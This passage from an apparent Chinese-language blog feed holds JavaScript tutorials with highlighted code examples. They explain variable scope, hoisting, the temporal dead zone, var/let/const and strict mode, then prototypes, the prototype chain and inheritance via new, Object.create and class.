    <span class="token keyword">let</span> x <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 10 外部x变量屏蔽，访问不到</span>
<span class="token punctuation">&#125;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>foo<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// bar 对象是引用型，变量bar与变量foo引用自相同对象，在bar中更改对象后，foo引用到的也是被修改后的对象</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>bar<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// bar</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 1 块中变量屏蔽，块外变量不受影响</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>对象是引用型，更底层的解释是对象存储在一个内存位置中，将对象通过变量赋值给其它变量，这些变量都引用自相同内存位置的同一对象，因此在一个变量上操作改变对象，内存中的对象被更改，其他变量引用的也是改变后的对象。<br>如果将对象直接赋值给不同变量，则每个变量中的对象看起来是相同的，但其实是存储在不同内存位置的不同对象。<br>const声明的基本类型值无法被更改，但const声明的数组和对象可以被更改，因为对象（数组）是引用型，const固定了指向对象（数组）内存位置的引用，但对象（数组）在内存中的内容没有固定。</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> foo <span class="token operator">=</span> <span class="token punctuation">&#123;</span>num<span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> foo1 <span class="token operator">=</span> foo<span class="token punctuation">;</span>
<span class="token keyword">const</span> bar <span class="token operator">=</span> <span class="token punctuation">&#123;</span>num<span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>foo <span class="token operator">===</span> foo1<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// true 通过变量赋值，foo与foo1实际引用自相同对象</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>foo <span class="token operator">===</span> bar<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// false 直接赋值，foo与bar是存储在不同内存位置的不同对象，但对象内容相同</span>
foo<span class="token punctuation">.</span>num <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>foo <span class="token operator">===</span> foo1<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// true foo修改了内存中的对象，foo1引用自那个对象，所以foo1也被自动更改了</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>foo<span class="token punctuation">,</span> foo1<span class="token punctuation">,</span> bar<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// &#123;num: 2&#125;, &#123;num: 2&#125;, &#123;num: 1&#125; foo与foo1引用自相同对象，bar和前两者引用自不同对象</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h1 id="变量提升"><a href="#变量提升" class="headerlink" title="变量提升"></a>变量提升</h1><p>在ES6引入let和const之前，变量都是用var来声明的。使用var声明的变量在当前作用域中任何地方都可以使用，甚至可以在声明前使用。这是因为使用var声明的变量采用了提升机制，javascript会扫描整个作用域（函数或全局作用域），任何使用var声明的变量都会被提升至当前作用域的顶部，被提升的只是对变量的声明，而不是赋值。</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>foo<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// undefined 变量提升，只提升声明，默认赋值为undefined</span>
<span class="token keyword">var</span> foo <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token comment">// 赋值为1</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>foo<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 1</span>
<span class="token comment">// 等价于</span>
<span class="token keyword">var</span> foo<span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>foo<span class="token punctuation">)</span><span class="token punctuation">;</span>
foo <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>foo<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>let与const没有变量提升机制，在声明前无法使用</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>bar<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// referenceError 直接报错，无法运行</span>
<span class="token keyword">let</span> bar <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>bar<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>由于var没有块作用域，且var有变量提升，故在当前作用域中，尽管可以在块内再次使用var，但并不会发生变量屏蔽，不能创建同名的新变量。</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> foo <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span>foo <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">var</span> foo <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>foo<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 1</span>
<span class="token punctuation">&#125;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>foo<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 1</span>
<span class="token comment">// 等价于</span>
<span class="token keyword">var</span> foo <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span>foo <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    foo <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>foo<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 1</span>
<span class="token punctuation">&#125;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>foo<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h1 id="临时死区TDZ"><a href="#临时死区TDZ" class="headerlink" title="临时死区TDZ"></a>临时死区TDZ</h1><p>由于ES6中let、const有块作用域，且let、const没有变量提升机制，故在块中再次声明同名变量会不小心产生临时死区。要防止临时死区应注意将所有声明都放在当前作用域顶部。</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">let</span> foo <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span>foo <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>foo<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// referenceError 这里就是临时死区</span>
    <span class="token keyword">let</span> foo <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token comment">// 因为块中用了let声明，块内的foo屏蔽了块外的foo，而上一句却在块中未声明foo时就使用foo</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>foo<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>foo<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>ES5中常用的类型检测方法，在ES6中就会因为临时死区而报错</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> foo <span class="token operator">===</span> <span class="token string">"undefined"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>       <span class="token comment">// referenceError</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"foo is safe to use"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">let</span> foo <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<h1 id="总结var、let、const"><a href="#总结var、let、const" class="headerlink" title="总结var、let、const"></a>总结var、let、const</h1><h2 id="var："><a href="#var：" class="headerlink" title="var："></a>var：</h2><ol>
<li>有变量提升机制。</li>
<li>没有块作用域，只有函数作用域和全局作用域，块中不会产生变量屏蔽，在函数作用域中才有变量屏蔽。</li>
<li>虽然在同一作用域同一变量名可以多重声明，但不创建新变量，仅相当于赋值操作。</li>
<li>在全局环境声明的变量会自动挂载为window的属性，不仅可以通过变量名访问，还可以通过window属性访问，window.变量名。</li>
</ol>
<h2 id="let、const相同点："><a href="#let、const相同点：" class="headerlink" title="let、const相同点："></a>let、const相同点：</h2><ol>
<li>没有变量提升机制。</li>
<li>有块作用域，块内会产生变量屏蔽，警惕因变量屏蔽、无提升机制造成的临时死区。</li>
<li>同一作用域同一变量名只能声明一次。</li>
<li>在全局环境声明的变量不会挂载为window的属性，只能通过变量名访问。</li>
</ol>
<h2 id="let、const区别："><a href="#let、const区别：" class="headerlink" title="let、const区别："></a>let、const区别：</h2><ol>
<li>let用于声明变量、const用于声明常量。</li>
<li>const声明与赋值必须同时进行，基本型值定义后无法更改，如字符串、数字等。</li>
<li>数组、对象为引用型值，const声明后固定了引用的内存位置，但未固定内容，故数组与对象可更改。</li>
</ol>
<h1 id="函数提升"><a href="#函数提升" class="headerlink" title="函数提升"></a>函数提升</h1><p>函数的声明也会被提升至当前作用域的顶部，允许函数在声明前使用。赋值给变量的函数表达式不会提升，作用域规则与变量相同。函数提升更高于变量提升，当函数声明与变量声明同名时，函数声明在前，变量声明在后。（尽量避免函数与变量同名）</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">f</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// f 函数提升，可以提前调用</span>
<span class="token function">g</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// referenceError：g未定义  函数未提升，变量未提升，无法调用，直接停止报错</span>
<span class="token function">h</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// typeError：h不是函数  函数未提升，变量提升只是声明提升，并未赋值，h为undefined</span>
<span class="token keyword">function</span> <span class="token function">f</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"f"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">let</span> <span class="token function-variable function">g</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"g"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> <span class="token function-variable function">h</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"h"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h1 id="严格模式"><a href="#严格模式" class="headerlink" title="严格模式"></a>严格模式</h1><p>ES5允许隐式全局变量，如果忘记使用var声明变量，javascript会认为你在引用全局变量，如果全局变量不存在，会自动创建一个。</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">f</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    a <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 1</span>
<span class="token punctuation">&#125;</span>
<span class="token function">f</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>为了防止这种情况以及this默认绑定到全局等情况，引入了严格模式。在全局或函数的开头写”use strict”，单双引号都可以，就开启了严格模式。<br>由于在全局中开启严格模式会应用到所有脚本代码中，故使用时要谨慎。很多网站在部署前会整合脚本代码，若一个脚本代码用了全局严格模式，则所有代码在整合后都会应用严格模式，为了防止这种情况，应该将用了严格模式的脚本代码封装在一个IIFE（立即执行函数）中，这样就不会干扰整合后的其它脚本。</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token string">"use strict"</span><span class="token punctuation">;</span>
    <span class="token comment">// 代码区</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      <categories>
        <category>javascript</category>
      </categories>
      <tags>
        <tag>作用域</tag>
        <tag>let</tag>
        <tag>const</tag>
        <tag>var</tag>
      </tags>
  </entry>
  <entry>
    <title>javascript原型与原型链及继承</title>
    <url>/2018/05/02/javascript%E5%8E%9F%E5%9E%8B%E4%B8%8E%E5%8E%9F%E5%9E%8B%E9%93%BE%E5%8F%8A%E7%BB%A7%E6%89%BF/</url>
    <content><![CDATA[<h2 id="原型链与继承"><a href="#原型链与继承" class="headerlink" title="原型链与继承"></a>原型链与继承</h2><p><img src="/images/relationship_between_function_and_prototype.png" alt="__proto__ and prototype"><br>这张图可以说是一图读懂原型链与继承了。这张图在原来的基础上加入了 es6 中的 class 语法，class 只是语法糖，本质上还是构造函数。</p>
<span id="more"></span>

<p>学习原型链与继承前，首先要搞懂三个基本点：</p>
<ol>
<li>在 js 中，万物皆对象，函数（Function）是对象，函数的原型（Function.prototype）是对象，它们都会有对象的共同特点。</li>
<li>对象都有__proto__属性，指向该对象构造函数的原型对象。原型链也是通过__proto__属性实现的。</li>
<li>函数是一种特殊的对象，除了对象都有的__proto__属性外，还有一个 prototype 属性，该属性指向函数的原型对象，原型对象中又有一个 constructor 属性，又指回了构造函数。</li>
</ol>
<p>接下来就讲解一下这张图：</p>
<h3 id="Foo-（class-Foo-）"><a href="#Foo-（class-Foo-）" class="headerlink" title="Foo()（class Foo {}）"></a>Foo()（class Foo {}）</h3><p>构造函数 Foo：有一个属性 prototype 指向其原型对象，原型对象中有 f1、f2 等等所有实例可以共享的方法。Foo 还有个__proto__属性指向其构造函数的原型对象 Function.prototype。（所有函数的构造函数是 Function 函数，其原型对象则为 Function.prototype）</p>
<p>原型对象 Foo.prototype：又有一个 constructor 属性，constructor 指向构造函数 Foo 本身。原型对象 Foo.prototype 也是对象，也有对象都有的属性__proto__，指向其构造函数 Object 的原型对象 Object.prototype。（所有对象的构造函数是 Object 函数，其原型对象为 Object.prototype)</p>
<p>实例对象 f1、f2：也有属性__proto__，指向构造函数 Foo 的原型对象 Foo.prototype，这样就可以访问原型对象中共享的所有方法了。</p>
<h3 id="class-Bar-extends-Foo"><a href="#class-Bar-extends-Foo" class="headerlink" title="class Bar extends Foo {}"></a>class Bar extends Foo {}</h3><p>这是 ES6 的语法糖，创建了一个 Foo 的子类，本质上还是构造函数，与 ES5 中通过 Foo 函数使用 Object.creat()等方法创建的子类相类似。Bar 继承了 Foo 的方法与属性。</p>
<p>构造函数 Bar：属性 prototype 指向其原型对象，__proto__属性则与一般的函数不同，指向父类的构造函数 Foo，而不是函数构造函数的原型对象 Function.prototype。</p>
<p>原型对象 Bar.prototype：constructor 属性指向构造函数 Bar 本身。__proto__属性也和一般原型对象不同，指向父类构造函数的原型对象 Foo.prototype，而不是对象构造函数的原型对象 Object.prototype。</p>
<p>实例对象 b1、b2：属性__proto__指向构造函数 Bar 的原型对象 Bar.prototype。</p>
<h3 id="Function"><a href="#Function" class="headerlink" title="Function()"></a>Function()</h3><p>构造函数 Function：prototype 属性指向其原型对象 Function.prototype。__proto__属性指向其构造函数的原型对象，由于 Function 的构造函数就是自己，所以__proto__属性也指向自己的原型对象 Function.prototype。</p>
<p>原型对象 Function.prototype：constructor 属性指向构造函数 Function 本身。__proto__属性指向构造函数的原型对象 Object.prototype。因为原型对象也是对象，对象的构造函数是 Object，Object 的原型对象为 Object.prototype。</p>
<h3 id="Object"><a href="#Object" class="headerlink" title="Object()"></a>Object()</h3><p>构造函数 Object：prototype 属性指向其原型对象 Object.prototype。__proto__属性指向其构造函数 Function 的原型对象 Function.prototype。</p>
<p>原型对象 Object.prototype：constructor 属性指向构造函数 Object 本身。__proto__属性指向 null。因为万物皆对象，对象的原型对象已经是最末端了，所以__proto__对象指向 null。</p>
<p>实例对象 o1、o2：不论是用对象字面量还是构造函数生成的对象，__proto__属性都指向其构造函数 Object 的原型对象 Object.prototype。</p>
<h3 id="原型链"><a href="#原型链" class="headerlink" title="原型链"></a>原型链</h3><p>由原型对象相互关联，组成的链状结构就是原型链。在图中可以直观看到所有__proto__的虚线构成了一条条的原型链。有了原型链，当试图访问一个对象的属性时，不仅仅在对象本身中查找，还会沿着原型链查找对象的原型对象，依次层层向上，直到找到一个名称匹配的属性或到达原型链的末尾，也就是 Object.prototype.__proto__即 null。</p>
<h3 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h3><p>对象都会从原型对象上继承属性和方法，这里继承并不是复制，而是通过__proto__在对象与原型对象间创建关联，一个对象通过这样的关联关系就可以访问另一个对象的属性与方法。</p>
<h3 id="proto-与-prototype-的作用"><a href="#proto-与-prototype-的作用" class="headerlink" title="__proto__与 prototype 的作用"></a>__proto__与 prototype 的作用</h3><p>prototype 所指向的原型对象是用来被其他对象继承的，而__proto__属性是用来保存从原型对象继承的索引关系的。</p>
<h2 id="proto-的由来"><a href="#proto-的由来" class="headerlink" title="__proto__的由来"></a>__proto__的由来</h2><p>说到__proto__的由来，就不能不提[[prototype]]属性。[[prototype]]属性是所有对象都有的私有属性（内置属性），在 ES5 以前没有原生的方法去访问[[prototype]]这个属性，于是各个浏览器厂商就定义了__proto__来读写[[prototype]]这个私有属性，本质上是一个访问器属性（一个 getter 函数和一个 setter 函数）。而直接读写[[prototype]]容易造成 bug 与性能问题，因此官方并不建议使用__proto__。在 ES5 中，官方加入了内置属性标准 Get 方法，Object.getPrototypeOf()。在 ES6 中，官方又加入了内置属性标准的 Set 方法，Object.setPrototypeOf()。</p>
<p>有趣的是__proto__属性也是一例典型的实践倒逼准则的案例，由于各大浏览器厂商对__proto__属性的支持，使该属性也被 ES6 的标准所囊括。</p>
<h2 id="proto-的指向"><a href="#proto-的指向" class="headerlink" title="__proto__的指向"></a>__proto__的指向</h2><p>根据前面讲到的，我们知道一个对象的__proto__属性通常指向其构造函数的原型对象。因此确定对象__proto__指向的关键点就在于找到其构造函数。接下来通过 4 种不同的构造对象的方法，来依次分析__proto__的指向。</p>
<h3 id="（1）对象字面量"><a href="#（1）对象字面量" class="headerlink" title="（1）对象字面量"></a>（1）对象字面量</h3><p>对象字面量就是直接声明对象的方式。</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> obj1 <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
  objName<span class="token operator">:</span> <span class="token string">'obj1'</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>事实上，对象字面量只是一种语法糖，本质上还是通过 new Object()的方式构造了对象。</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// 上例本质上等价于</span>
<span class="token keyword">const</span> obj1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
obj1<span class="token punctuation">.</span>objName <span class="token operator">=</span> <span class="token string">'obj1'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>因此，通过对象字面量构造出的对象的__proto__属性都指向构造函数 Object 的原型对象 Object.prototype</p>
<h3 id="（2）new-关键字"><a href="#（2）new-关键字" class="headerlink" title="（2）new 关键字"></a>（2）new 关键字</h3><p>如果通过 new 关键字创建一个普通的对象（同上例），则对象的__proto__属性同上，指向 Object.prototype。</p>
<p>如果用自定义的构造函数（如 Foo）通过 new 关键字创建实例对象，则对象的__proto__属性指向那个自定义构造函数的原型对象（如 Foo.prototype）。</p>
<p>new 实现过程大致如下</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// 例如new Object()相当于</span>
<span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">const</span> obj <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
  obj<span class="token punctuation">.</span>__proto__ <span class="token operator">=</span> <span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">;</span>
  <span class="token function">Object</span><span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> arguments<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> obj<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// 再例const f = new Foo()相当于</span>
<span class="token keyword">const</span> f <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">const</span> obj <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
  obj<span class="token punctuation">.</span>__proto__ <span class="token operator">=</span> <span class="token class-name">Foo</span><span class="token punctuation">.</span>prototype<span class="token punctuation">;</span>
  <span class="token function">Foo</span><span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> arguments<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> obj<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="（3）Object-create-proto"><a href="#（3）Object-create-proto" class="headerlink" title="（3）Object.create(proto)"></a>（3）Object.create(proto)</h3><p>通过 Object.create 方法创建的对象，其__proto__属性指向该方法的第一个参数 proto。（create 方法还有别的参数，这里不涉及）</p>
<p>上面是结论，我们分析一下 Object.create 方法的实现方式，再来看其本质。</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">create</span><span class="token punctuation">(</span><span class="token parameter">proto</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">function</span> <span class="token constant">F</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
  <span class="token class-name">F</span><span class="token punctuation">.</span>prototype <span class="token operator">=</span> proto<span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">F</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>可以看到 create 方法的实现本质上也是用了 new 关键字，不同的是 create 方法创造出的对象没有构造函数 constructor。没有构造函数只是说我们在外部无法访问构造函数，但函数运行过程中还是存在的，运行完后被销毁了。</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// 假设新建对象为f</span>
<span class="token keyword">const</span> f <span class="token operator">=</span> Object<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span>proto<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// 在create内部上一行实质相当于</span>
<span class="token keyword">const</span> f <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">F</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// 按照new关键字构造对象的__proto__属性指向的基本原则,</span>
<span class="token comment">// 对象f的__proto__属性指向构造函数F的原型对象F.prototype</span>
f<span class="token punctuation">.</span>__proto__ <span class="token operator">===</span> <span class="token class-name">F</span><span class="token punctuation">.</span>prototype<span class="token punctuation">;</span> <span class="token comment">//true</span>
<span class="token comment">// 而在create方法的实现中F.prototype被赋值为传入的参数proto</span>
<span class="token class-name">F</span><span class="token punctuation">.</span>prototype <span class="token operator">===</span> proto<span class="token punctuation">;</span> <span class="token comment">//true</span>
<span class="token comment">// 则得出</span>
f<span class="token punctuation">.</span>__proto__ <span class="token operator">===</span> proto<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>由此看出 Object.create 方法构造出的对象的__proto__属性指向第一个参数 proto。</p>
<p>Object.create 方法与 new 关键字在功能上是基本相同的，Object.create 优点是对函数与对象都可以使用，而 new 只能对函数使用。缺点是 Object.create 与 new 相比性能较差。</p>
<h3 id="（4）class"><a href="#（4）class" class="headerlink" title="（4）class"></a>（4）class</h3><p>class 是 ES6 新增的模仿类的语法，其本质上还是基于原型的构造函数，class 只是语法糖。通过 class 构造函数 new 的实例，实例的__proto__属性指向 class 构造函数的原型对象。</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">class</span> <span class="token class-name">Foo</span> <span class="token punctuation">&#123;</span>
  <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">const</span> foo <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
foo<span class="token punctuation">.</span>__proto__ <span class="token operator">===</span> <span class="token class-name">Foo</span><span class="token punctuation">.</span>prototype<span class="token punctuation">;</span> <span class="token comment">// true</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>类中最重要的是继承，值得注意的是子类的__proto__属性指向与一般情况不同。子类构造函数的__proto__属性指向父类构造函数，子类构造函数的原型对象的__proto__属性指向父类构造函数的原型对象。</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">class</span> <span class="token class-name">Bar</span> <span class="token keyword">extends</span> <span class="token class-name">Foo</span> <span class="token punctuation">&#123;</span>
  <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">super</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">const</span> bar <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Bar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
